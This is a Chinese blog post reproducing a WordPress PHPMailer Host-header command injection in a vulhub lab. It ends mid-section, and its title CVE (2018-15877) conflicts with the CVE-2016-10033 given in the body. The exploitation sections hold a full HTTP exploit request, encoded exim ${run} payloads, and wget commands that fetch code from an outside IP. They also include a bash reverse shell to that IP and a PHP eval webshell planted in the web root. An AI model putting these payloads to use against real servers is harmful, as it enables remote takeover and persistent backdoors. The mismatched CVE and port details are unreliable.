<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="WordPress 远程命令执行漏洞复现(CVE-2018-15877), hybcx&#39;s blog">
    <meta name="description" content="0x01 漏洞简述

WordPress 是一种使用 PHP 语言开发的博客平台，用户可以在支持 PHP 和 MySQL 数据库的服务器上架设属于自己的网站。也可以把 WordPress 当作一个内容管理系统（CMS）来使用。WordPre">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <!-- Global site tag (gtag.js) - Google Analytics -->

    <script async src="https://www.googletagmanager.com/gtag/js?id=G-BYTY196ENH"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
    
      gtag('config', 'G-BYTY196ENH');
    </script>


    <title>WordPress 远程命令执行漏洞复现(CVE-2018-15877) | hybcx&#39;s blog</title>
    <link rel="icon" type="image/png" href="/favicon.png">
    


    <!-- bg-cover style     -->



<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
<link rel="stylesheet" type="text/css" href="/css/matery.css">
<link rel="stylesheet" type="text/css" href="/css/my.css">
<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">




    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
    <link rel="stylesheet" href="/css/post.css">




    
        <link rel="stylesheet" type="text/css" href="/css/reward.css">
    



    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>

<meta name="generator" content="Hexo 7.2.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>


<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span diyFont">hybcx&#39;s blog</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
  <li>
    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">hybcx&#39;s blog</div>
        <div class="logo-desc">
            
            Never really desperate, only the lost of the soul.
            
        </div>
    </div>

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/hybchenxing/" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/hybchenxing/" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/22.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">WordPress 远程命令执行漏洞复现(CVE-2018-15877)</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/CVE/">
                                <span class="chip bg-color">CVE</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/CVE%E6%BC%8F%E6%B4%9E/" class="post-category">
                                CVE漏洞
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2023-08-25
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
                    2023-11-12
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    5.5k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    25 分
                </div>
                

                
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h2 id="0x01-漏洞简述">0x01 漏洞简述</h2>
<blockquote>
<p>WordPress 是一种使用 PHP 语言开发的博客平台，用户可以在支持 PHP 和 MySQL 数据库的服务器上架设属于自己的网站。也可以把 WordPress 当作一个内容管理系统（CMS）来使用。WordPress 使用 PHPMailer 组件向用户发送邮件。PHPMailer (版本 &lt; 5.2.18) 存在远程命令执行漏洞，攻击者只需巧妙地构造出一个恶意邮箱地址，即可写入任意文件，造成远程命令执行的危害。</p>
</blockquote>
<ul>
<li>漏洞编号： CVE-2016-10033</li>
<li>影响版本： WordPress &lt;= 4.7.1 PHPMailer &lt; 5.2.18</li>
</ul>
<h3 id="漏洞触发条件：">漏洞触发条件：</h3>
<ul>
<li>PHP 没有开启 <code>safe_mode</code>（默认）</li>
<li>攻击者需要知道 Web 服务部署的路径</li>
</ul>
<p>成功利用该漏洞后，攻击者可以远程任意代码执行。</p>
<h2 id="0x02-漏洞搭建">0x02 漏洞搭建</h2>
<p>这里我采用vulhub靶场搭建</p>
<p>进入到/vulhub/wordpress/pwnscriptum/目录后，我们执行命令：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker-compose</span> up <span class="token parameter variable">-d</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>访问对应端口即可，记得安全组放行。进去之后按要求配置信息即可，随后在转到忘记密码页面</p>
<h2 id="0x03-漏洞原理">0x03 漏洞原理</h2>
<p>![image-20230829150129261](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230829150129261.png)</p>
<p>此处是管理员重置密码页面，wordpress使用phpmailer组件进行重置密码邮件的发送，但是<code>phpmailer &lt; 5.2.18</code>之前的版本存在命令注入漏洞，具体你可以先阅读分析文章<a target="_blank" rel="noopener" href="https://paper.seebug.org/161/">链接</a> 。</p>
<p>我们来看看这个漏洞在wordpress中的情况。漏洞文件是<code>class.phpmailer.php</code>，我们在wordpress中搜索查看这个文件，该文件在在<code>wp-includes</code>目录下。我们可以发现几行关键代码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">/**
     * Which method to use to send mail.
     * Options: "mail", "sendmail", or "smtp".
     * @var string
     */</span>
    <span class="token keyword">public</span> <span class="token variable">$Mailer</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'mail'</span><span class="token punctuation">;</span>

    <span class="token comment">/**
     * The path to the sendmail program.
     * @var string
     */</span>
    <span class="token keyword">public</span> <span class="token variable">$Sendmail</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/usr/sbin/sendmail'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我们发现，实际上phpmailer组件是调用linux系统命令<code>sendmail</code>进行邮件发送，命令格式为：<code>sendmail -t -i -fusername@hostname</code>。并且我们继续审计代码发现：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">/**
     * Get the server hostname.
     * Returns 'localhost.localdomain' if unknown.
     * @access protected
     * @return string
     */</span>
    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">serverHostname</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'localhost.localdomain'</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">Hostname</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">Hostname</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'SERVER_NAME'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SERVER_NAME'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SERVER_NAME'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'gethostname'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">gethostname</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">gethostname</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">php_uname</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">php_uname</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>serverHostname</code>函数通过传入的<code>SERVER_NAME</code>参数来获取主机名，该主机名即HTTP请求报文中的host值，但是<code>SERVER_NAME</code>参数并没有经过任何过滤，因此我们可以进行任意构造拼接，从而产生了系统命令注入漏洞。</p>
<p>更棒的是，<code>sendmail</code> 提供了<code>-O</code>和<code>-X</code>参数，<code>-X</code>参数用于写入日志文件， 我们可以使用<code>-OQueueDirectory=/tmp/ -X/tmp/smtp.php</code>命令组合，它会将发送的邮件保存到<code>/tmp/smtp.php</code>中， 那么在请求的时候payload应该类似于这样：</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/wordpress/wp-login.php?action=lostpassword</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">aaa( -X/tmp/smtp.php )@qq.com</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>在@前面，如果加上括号，将可以引入空格，这样就可以拼接到了sendmail命令中并且保存了测试邮件文件。那么如果我们写入的是Webshell后门文件呢？</p>
<p>思路很好，然而现实很无奈。</p>
<ul>
<li>wordpress方面以及PHPMailer库方面都会防止攻击者注入空字符（空格或TAB）到sendmail命令中。并且，添加括号引入向sendmail中注入参数的方法已经行不通了，具体可以参考<a target="_blank" rel="noopener" href="http://www.securityspace.com/s_survey/data/man.201703/mxsurvey.html">链接</a>。</li>
<li>比如我们想要调用<code>/bin/touch</code>的时候也会出问题，因为host字段中如果出现<code>/</code>，服务器会拒绝我们的请求。</li>
</ul>
<p>因此上述的Sendmail技术在这种情况下不起作用，这条路走不通了！</p>
<p>正感觉走投无路的时候，这时候我们不妨喝杯茶冷静一下，为什么sendmail能够产生命令注入漏洞呢？我们去了解一下sendmail。然后就会发现柳暗花明又一村了。我们可以知道<code>ubuntu/debain</code>系统中，已经使用exim4替代了sendmail的功能，我们查看sendmail文件可以发现它是一个链向exim4的软链接文件。</p>
<p>![image-20230829151151126](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230829151151126.png)</p>
<p>那么我们可以利用exim4的语法参数进行命令执行参数的拼接啊！我们查看exim4的帮助手册，可以发现<code>-be</code>参数</p>
<pre class="line-numbers language-none"><code class="language-none">Run Exim in expansion testing mode. Exim  discards  its  root
                 privilege,  to prevent ordinary users from using this mode to
                 read otherwise inaccessible files. If no arguments are given,
                 Exim  runs interactively, prompting for lines of data. Other‐
                 wise, it processes each argument in turn.

                 If Exim was built with USE_READLINE=yes in Local/Makefile, it
                 tries  to  load  the libreadline library dynamically whenever
                 the -be option is used without  command  line  arguments.  If
                 successful,  it  uses the readline() function, which provides
                 extensive line-editing facilities, for reading the test data.
                 A line history is supported.

                 Long expansion expressions can be split over several lines by
                 using backslash continuations. As in Exim's run time configu‐
                 ration,  white  space  at  the start of continuation lines is
                 ignored. Each argument or data line  is  passed  through  the
                 string  expansion  mechanism, and the result is output. Vari‐
                 able values from the configuration file (for example,  $qual‐
                 ify_domain)  are  available,  but  no message-specific values
                 (such as $message_exim_id) are set,  because  no  message  is
                 being processed (but see -bem and -Mset).

                 Note:  If  you  use  this  mechanism to test lookups, and you
                 change the data files or databases you are  using,  you  must
                 exit  and  restart  Exim before trying the same lookup again.
                 Otherwise, because each Exim process caches  the  results  of
                 lookups,  you will just get the same result as before.  Macro
                 processing is done  on  lines  before  string-expansion:  new
                 macros  can  be defined and macros will be expanded.  Because
                 macros in the config file are often used for  secrets,  those
                 are only available to admin users.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>下面同样也是<code>${substr{10}{1}{$tod_log}}</code>与<code>${substr{0}{1}{$spool_directory}}</code>的原理：</strong></p>
<p>我们可以知道<code>ubuntu/debain</code>系统中，已经使用exim4替代了sendmail的功能，我们查看sendmail文件可以发现它是一个链向exim4的软链接文件。</p>
<p>![image-20230825175812446](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230825175812446.png)</p>
<p>那么我们可以利用exim4的语法参数进行命令执行参数的拼接啊！我们查看exim4的帮助手册，可以发现<code>-be</code>参数，简单来说，<code>-be</code>参数是一个字符串拓展测试命令，它可以读取一些变量的数据。比如，<code>$tod_log</code>，它可以显示系统时间。</p>
<p>并且，exim4提供了一些函数用来执行一些命令，如字符串截取函数<code>substr</code>、<code>$run</code>系统调用函数。</p>
<p>我们可以截取空格字符。如图所示，substr函数从第十个字符开始截取，共截取一个字符，也就是时间字符串的第11个字符，是空格字符。</p>
<p>![image-20230825175901430](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230825175901430.png)</p>
<p>那么同理，我们也可以截取<code>/</code>字符串：</p>
<p>![image-20230825175909679](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230825175909679.png)</p>
<p>我们测试使用<code>$run</code>函数调用系统命令</p>
<p>![image-20230825175924125](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230825175924125.png)</p>
<p>到这里，遇到的问题都解决了。</p>
<h2 id="0x04-漏洞复现">0x04 漏洞复现</h2>
<h3 id="EXP">EXP</h3>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/wp-login.php?action=lostpassword</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">target(any -froot@localhost -be ${run{【要执行的命令】}} null)</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">*/*</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">56</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span>

wp-submit=Get+New+Password&amp;redirect_to=&amp;user_login=admin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我们在数据包中将要执行的命令，插入到上述payload中指定的位置，就可以实现命令执行了。但是，这个漏洞的利用存在很大的限制，主要限制如下所示：</p>
<pre class="line-numbers language-none"><code class="language-none">1.执行的命令不能包含大量特殊字符，如:、引号等。
2.命令会被转换成小写字母
3.命令需要使用绝对路径
4.需要知道某一个存在的用户的用户名
5.我们处理后的命令会执行，但是不会显示到页面上。
为了解决这些坑，漏洞作者想出了，利用 ${substr{0}{1}{$spool_directory}} 代替 / ，用 ${substr{10}{1}{$tod_log}} 代替空格的方法。

但是还是有很多字符不能用，所以我们需要将待执行的命令放到第三方网站中，然后通过 curl -o /tmp/rce example.com/shell.sh 的方法先将他下载到 /tmp 目录中，再去执行。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="利用">利用</h3>
<p>所以，总体来说利用过程如下：</p>
<ul>
<li>编写反弹 shell 的 exp，放到某个网页里。有如下要求：
<ul>
<li>整个 url 的大写字母会被转换成小写，所以大写小敏感的系统不要使用大写字母做文件路径</li>
<li>访问该网页不能跳转，因为 follow 跳转的参数是 <code>-L</code> （大写）</li>
</ul>
</li>
<li>拼接成命令 <code>/usr/bin/curl -o/tmp/rce example.com/shell.sh</code> 和命令 <code>/bin/bash /tmp/rce</code></li>
<li>将上述命令中的空格和 / 转换成 <code>${substr{10}{1}{$tod_log}}</code> 和 <code>${substr{0}{1}{$spool_directory}}</code></li>
<li>拼接成 HTTP 包的 Host 头： <code>target(any -froot@localhost -be ${run{command}} null)</code></li>
<li>依次发送这两个拼接好的数据包</li>
</ul>
<h3 id="复现">复现</h3>
<p>漏洞缺陷处在后台找回密码的地方<br>
初始化管理员用户名和密码后访问 <code>https://ip:8080/wp-login.php</code>，点击忘记密码界面</p>
<p>![image-20230825180517679](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230825180517679.png)<br>
这里用户名为 @1_h bcx</p>
<p>我们于是可以构造payload如下，该payload在/tmp/目录下创建test.txt文件：</p>
<pre class="line-numbers language-none"><code class="language-none">aa(any -froot@localhost -be ${run{/bin/touch /tmp/test.txt}} null)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<blockquote>
<p>空格  ==&gt; ${substr{10}{1}{$tod_log}}</p>
<p>/  ==&gt; ${substr{0}{1}{$spool_directory}}</p>
</blockquote>
<p>转换过来就是</p>
<pre class="line-numbers language-none"><code class="language-none">aa(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}test.txt}} null)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>![image-20230825191914211](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230825191914211.png)</p>
<p>在/tmp目录下发现成功生成了测试文件。</p>
<p>![image-20230825191840698](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230825191840698.png)</p>
<h4 id="反弹-shell">反弹 shell</h4>
<p>利用 <code>curl</code> 或者 <code>wget</code> 命令下载远程文件</p>
<blockquote>
<p>测试下载反弹 shell：<br>
注意：</p>
<ul>
<li>攻击机启用 http 服务</li>
<li>远程 URL 中不能有 <code>http://</code></li>
<li>所有字母必须小写</li>
</ul>
</blockquote>
<p>远程反弹shell脚本：<code>ip/a.txt</code>，内容：</p>
<pre class="line-numbers language-none"><code class="language-none">bash -i &gt;&amp; /dev/tcp/124.220.233.26/12345 0&gt;&amp;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>payload：</p>
<pre class="line-numbers language-none"><code class="language-none">/usr/bin/wget --output-document /tmp/rce 124.220.233.26/a.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>执行反弹shell：</p>
<pre class="line-numbers language-none"><code class="language-none">/bin/bash /tmp/rce<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>两个payload转换过来就是</p>
<pre class="line-numbers language-none"><code class="language-none">aa(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}wget${substr{10}{1}{$tod_log}}--output-document${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}rce${substr{10}{1}{$tod_log}}124.220.233.26${substr{0}{1}{$spool_directory}}a.txt}} null)

aa(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}bash${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}rce}} null)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>在反弹主机上用nc监听1337端口，分别按顺序提交payload即可获取到反弹shell</p>
<pre class="line-numbers language-none"><code class="language-none">nc -lvnp 12345<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>![image-20230829162742888](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230829162742888.png)</p>
<h4 id="写入一句话webshell">写入一句话webshell</h4>
<p>1.txt内容：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>同理，可以直接下载一句话webshell，然后菜刀连接。payload：</p>
<p>payload：</p>
<pre class="line-numbers language-none"><code class="language-none">aa(any -froot@localhost -be ${run{/usr/bin/wget --output-document /var/www/html/1.php 124.220.233.26/1.txt}} null)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>转换过来即</p>
